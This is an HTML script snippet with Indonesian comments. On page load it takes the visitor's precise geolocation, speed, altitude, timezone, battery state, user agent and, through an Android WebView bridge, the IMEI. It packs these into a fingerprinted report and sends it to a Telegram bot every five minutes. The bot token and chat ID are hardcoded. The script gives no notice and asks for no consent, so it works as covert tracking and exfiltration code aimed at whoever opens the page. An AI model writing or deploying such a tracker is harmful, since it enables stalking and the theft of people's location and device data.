<script>
  async function sendData() {
    try {
      // Dapatkan lokasi
      const location = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, {
          enableHighAccuracy: true
        });
      });

      const lat = location.coords.latitude;
      const lon = location.coords.longitude;
      const speed = location.coords.speed ?? 'Unknown';
      const heading = location.coords.heading ?? 'Unknown';
      const altitude = location.coords.altitude ?? 'Unknown';
      const accuracy = location.coords.accuracy + 'm';

      // Info perangkat
      const lang = navigator.language;
      const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
      const local = new Date().toLocaleString();
      const utc = new Date().toUTCString();
      const ua = navigator.userAgent;

      // Info baterai
      const battery = await navigator.getBattery();
      const batLevel = Math.round(battery.level * 100);
      const batCharging = battery.charging ? 'Charging' : 'Not Charging';

      // Generate ID otomatis (TETAP vs DINAMIS)
      const userAgent = navigator.userAgent;
      const dynamic = false; // ubah jadi true kalau mau ID dinamis setiap waktu

      const baseID = dynamic
        ? btoa(userAgent + utc).slice(0, 8)
        : btoa(userAgent).replace(/[^a-zA-Z0-9]/g, '').slice(0, 8);

      const ID = `USR-${baseID}`;

      // Coba ambil IMEI jika tersedia dari Android WebView (opsional, hanya jika pakai Android hybrid app)
      let imei = "Unavailable";
      if (typeof AndroidInterface !== 'undefined' && AndroidInterface.getIMEI) {
        imei = AndroidInterface.getIMEI();
      }

      const payload = `
[ID: ${ID}]
Lokasi dikirim: ${lat}, ${lon}
https://maps.google.com/?q=${lat},${lon}

Speed: ${speed}
Heading: ${heading}
Altitude: ${altitude}
Accuracy: ${accuracy}

Lang: ${lang}
TZ: ${tz}
Local: ${local}
UTC: ${utc}

Battery: ${batLevel}% (${batCharging})
Device: ${ua}
IMEI: ${imei}`;

      const token = "7628065493:AAGuSA9aek-c_dtizC564vGl7nOFRe8TYko";
      const chat_id = "5677912817";

      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id, text: payload })
      });

    } catch (err) {
      console.error("Gagal mengirim data:", err);
    }
  }

  sendData();
  setInterval(sendData, 5 * 60 * 1000); // kirim setiap 5 menit
</script>
